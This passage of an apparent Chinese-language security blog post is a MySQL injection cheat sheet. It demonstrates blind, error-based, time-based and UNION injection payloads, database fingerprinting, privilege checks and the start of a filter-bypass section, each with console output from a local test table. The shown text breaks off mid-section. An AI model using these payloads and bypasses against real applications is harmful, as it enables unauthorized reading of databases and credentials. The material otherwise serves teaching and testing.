@@ -1,0 +1,1495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Sql-Cheat-Sheet - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="常见注入方式 1.Boolean-based blinds 1 2 3 4 5 6 7 8 9 10 11 12 mysql&amp;gt; select*from`test`where`id`=1 and left(version(),1)=8; &#43;----&#43;----------&#43;----------------------------------&#43; | id | username | password | &#43;----&#43;----------&#43;----------------------------------&#43; | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | mysql&amp;gt; select*from`test`where`id`=1 and ascii(substr((select table_name from information_schema.tables where table_schema=data base() limit 0,1),2,1))=101; &#43;----&#43;----------&#43;----------------------------------&#43; | id | username | password | &#43;----&#43;----------&#43;----------------------------------&#43; | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | &#43;----&#43;----------&#43;----------------------------------&#43; 2.Error-based" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/sql-cheat-sheet/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Sql-Cheat-Sheet" />
+<meta property="og:description" content="常见注入方式 1.Boolean-based blinds 1 2 3 4 5 6 7 8 9 10 11 12 mysql&gt; select*from`test`where`id`=1 and left(version(),1)=8; &#43;----&#43;----------&#43;----------------------------------&#43; | id | username | password | &#43;----&#43;----------&#43;----------------------------------&#43; | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | mysql&gt; select*from`test`where`id`=1 and ascii(substr((select table_name from information_schema.tables where table_schema=data base() limit 0,1),2,1))=101; &#43;----&#43;----------&#43;----------------------------------&#43; | id | username | password | &#43;----&#43;----------&#43;----------------------------------&#43; | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | &#43;----&#43;----------&#43;----------------------------------&#43; 2.Error-based" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/sql-cheat-sheet/" />
+<meta property="article:published_time" content="2018-10-09T22:26:08&#43;00:00"/>
+<meta property="article:modified_time" content="2018-10-09T22:26:08&#43;00:00"/>
+
+<meta itemprop="name" content="Sql-Cheat-Sheet">
+<meta itemprop="description" content="常见注入方式 1.Boolean-based blinds 1 2 3 4 5 6 7 8 9 10 11 12 mysql&gt; select*from`test`where`id`=1 and left(version(),1)=8; &#43;----&#43;----------&#43;----------------------------------&#43; | id | username | password | &#43;----&#43;----------&#43;----------------------------------&#43; | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | mysql&gt; select*from`test`where`id`=1 and ascii(substr((select table_name from information_schema.tables where table_schema=data base() limit 0,1),2,1))=101; &#43;----&#43;----------&#43;----------------------------------&#43; | id | username | password | &#43;----&#43;----------&#43;----------------------------------&#43; | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | &#43;----&#43;----------&#43;----------------------------------&#43; 2.Error-based">
+
+
+<meta itemprop="datePublished" content="2018-10-09T22:26:08&#43;00:00" />
+<meta itemprop="dateModified" content="2018-10-09T22:26:08&#43;00:00" />
+<meta itemprop="wordCount" content="3752">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Sql-Cheat-Sheet"/>
+<meta name="twitter:description" content="常见注入方式 1.Boolean-based blinds 1 2 3 4 5 6 7 8 9 10 11 12 mysql&gt; select*from`test`where`id`=1 and left(version(),1)=8; &#43;----&#43;----------&#43;----------------------------------&#43; | id | username | password | &#43;----&#43;----------&#43;----------------------------------&#43; | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | mysql&gt; select*from`test`where`id`=1 and ascii(substr((select table_name from information_schema.tables where table_schema=data base() limit 0,1),2,1))=101; &#43;----&#43;----------&#43;----------------------------------&#43; | id | username | password | &#43;----&#43;----------&#43;----------------------------------&#43; | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | &#43;----&#43;----------&#43;----------------------------------&#43; 2.Error-based"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Sql-Cheat-Sheet</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#常见注入方式">常见注入方式</a>
+<ul>
+<li><a href="#1-boolean-based-blinds">1.Boolean-based blinds</a></li>
+<li><a href="#2-error-based">2.Error-based</a></li>
+<li><a href="#3-and-or-time-based-blind">3.AND/OR time-based blind</a></li>
+<li><a href="#4-union-query">4.UNION query</a></li>
+</ul></li>
+<li><a href="#常用函数">常用函数</a></li>
+<li><a href="#判断是否具有读写权限">判断是否具有读写权限</a></li>
+<li><a href="#注入绕过">注入绕过</a>
+<ul>
+<li><a href="#1-字段列数不够">1.字段列数不够</a></li>
+<li><a href="#2-过滤空格">2.过滤空格</a></li>
+<li><a href="#3-过滤from-x">3.过滤from x</a></li>
+<li><a href="#4-过滤逗号">4.过滤逗号</a></li>
+<li><a href="#5-过滤大于小于">5.过滤大于小于</a></li>
+<li><a href="#6-运算比较之空格过滤">6.运算比较之空格过滤</a></li>
+<li><a href="#7-过滤and-or-xor-not">7.过滤and or xor not</a></li>
+<li><a href="#8-万能密码之or-and优先级">8.万能密码之or and优先级</a></li>
+<li><a href="#9-过滤引号">9.过滤引号</a></li>
+<li><a href="#10-过滤tables">10.过滤tables</a></li>
+<li><a href="#11-过滤select">11.过滤select</a></li>
+<li><a href="#12-过滤union">12.过滤union</a></li>
+<li><a href="#13-过滤">13. 过滤=</a></li>
+<li><a href="#14-过滤updatexml及extractvalue">14.过滤updatexml及extractvalue</a></li>
+<li><a href="#15-组合过滤之-preg-match-and-or-union-where-i-id">15.组合过滤之 <code>preg_match('/(and|or|union|where)/i',$id)</code></a></li>
+<li><a href="#16-组合过滤之-preg-match-and-or-union-where-limit-i-id">16.组合过滤之 <code>preg_match('/(and|or|union|where|limit)/i', $id)</code></a></li>
+<li><a href="#17-组合过滤之-preg-match-and-or-union-where-limit-group-by-i-id">17.组合过滤之 <code>preg_match('/(and|or|union|where|limit|group by)/i', $id)</code></a></li>
+<li><a href="#18-组合过滤之-preg-match-and-or-union-where-limit-group-by-select-i-id">18.组合过滤之 <code>preg_match('/(and|or|union|where|limit|group by|select)/i', $id)</code></a></li>
+<li><a href="#19-过滤-column">19.过滤 column</a></li>
+<li><a href="#20-order-by-注入">20.order by 注入</a></li>
+</ul></li>
+<li><a href="#tips">tips</a>
+<ul>
+<li><a href="#1-爆所有表列">1.爆所有表列</a></li>
+<li><a href="#2-利用报错发现库表列">2.利用报错发现库表列</a></li>
+<li><a href="#3-getshell">3.getshell</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h2 id="常见注入方式">常见注入方式</h2>
+
+<h3 id="1-boolean-based-blinds">1.Boolean-based blinds</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">left</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">8</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">data</span> <span class="n">base</span><span class="p">()</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">101</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="2-error-based">2.Error-based</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="k">version</span><span class="p">(),</span><span class="o">@@</span><span class="n">version_compile_os</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="n">x</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">character_sets</span> <span class="k">group</span> <span class="k">by</span> <span class="n">x</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">--------+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span>     <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>      <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span> <span class="o">|</span> <span class="n">osx10</span><span class="p">.</span><span class="mi">13</span> <span class="o">|</span> <span class="mi">0</span>                                <span class="o">|</span>
+<span class="o">|</span> <span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span> <span class="o">|</span> <span class="n">osx10</span><span class="p">.</span><span class="mi">13</span> <span class="o">|</span> <span class="mi">1</span>                                <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="3-and-or-time-based-blind">3.AND/OR time-based blind</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span><span class="n">Time</span><span class="p">:</span> <span class="mi">2</span><span class="p">.</span><span class="mi">053</span><span class="n">s</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">or</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="n">Time</span><span class="p">:</span> <span class="mi">6</span><span class="p">.</span><span class="mi">226</span><span class="n">s</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="4-union-query">4.UNION query</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">4</span>  <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="常用函数">常用函数</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">concat：将多个字符串连接成一个字符串
+group_concat：返回一个字符串结果，该结果由分组中的值连接组合而成
+concat_ws： concat with separator 指定参数之间的分隔符
+system_user()：系统用户名
+user()：用户名
+current_user：当前用户名
+session_user()：连接数据库的用户名
+database()：数据库名
+version()：数据库版本
+load_file()：读取本地文件的函数
+@@datadir：读取数据库路径（5.0 以上版本）
+@@basedir：安装路径
+@@version_complie_os：操作系统
+@@HOSTNAME 主机名</pre></td></tr></table>
+</div>
+</div>
+<h2 id="判断是否具有读写权限">判断是否具有读写权限</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="err">读取</span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="err">写入</span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="n">file_priv</span><span class="p">)</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="n">file_priv</span><span class="p">)</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">0</span>
+<span class="o">+</span><span class="c1">----+----------+----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="注入绕过">注入绕过</h2>
+
+<h3 id="1-字段列数不够">1.字段列数不够</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="k">null</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="n">x</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">group</span> <span class="k">by</span> <span class="n">x</span><span class="p">;</span>
+<span class="p">(</span><span class="mi">1222</span><span class="p">,</span> <span class="n">u</span><span class="s1">&#39;The used SELECT statements have a different number of columns&#39;&#39;)
+</span><span class="s1">
+</span><span class="s1">mysql&gt; select * from test where id=1 union select null,null,floor(rand(0)*2)x from information_schema.tables group by x;  -- 用null或者其他字符填充
+</span><span class="s1">+--------+----------+----------------------------------+
+</span><span class="s1">| id     | username | password                         |
+</span><span class="s1">+--------+----------+----------------------------------+
+</span><span class="s1">| 1      | admin    | 21232f297a57a5a743894a0e4a801fc3 |
+</span><span class="s1">| &lt;null&gt; | &lt;null&gt;   | 0                                |
+</span><span class="s1">| &lt;null&gt; | &lt;null&gt;   | 1                                |
+</span><span class="s1">+--------+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="2-过滤空格">2.过滤空格</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">test</span><span class="p">)</span><span class="k">where</span><span class="p">(</span><span class="n">id</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">username</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="n">E0union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="c1">--浮点数 1.0
+</span><span class="c1"></span><span class="o">+</span><span class="c1">----+----------+----------------------------------+
